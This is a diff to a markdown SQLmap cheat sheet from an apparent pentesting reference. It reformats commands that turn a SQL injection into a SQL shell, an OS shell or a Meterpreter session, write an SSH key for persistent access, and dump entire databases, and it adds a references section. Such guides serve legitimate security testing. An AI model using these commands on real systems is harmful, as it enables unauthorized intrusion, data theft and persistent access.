@@ -22,7 +22,7 @@ However you should always know how SQLmap is working, and be able to replicate i
     * [Tamper Scripts](#tamper-scripts)
 * [Reduce Requests Number](#reduce-requests-number)
 * [SQLmap Without SQL Injection](#sqlmap-without-sql-injection)
-
+* [References](#references)
 
 ## Basic Arguments For SQLmap
 
@@ -62,10 +62,25 @@ sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrat
 
 ## Getting A Shell
 
-* SQL Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell`
-* OS Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell`
-* Meterpreter: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn`
-* SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`
+* SQL Shell: 
+    ```ps1
+    python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
+    ```
+
+* OS Shell: 
+    ```ps1
+    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
+    ```
+    
+* Meterpreter: 
+    ```ps1
+    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
+    ```
+
+* SSH Shell: 
+    ```ps1
+    python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
+    ```
 
 
 ## Crawl And Auto-Exploit
@@ -223,3 +238,9 @@ You can use SQLmap to access a database via its port instead of a URL.
 ```ps1
 sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
 ```
+
+
+## References
+
+- [#SQLmap protip - @zh4ck - March 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)
+- [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
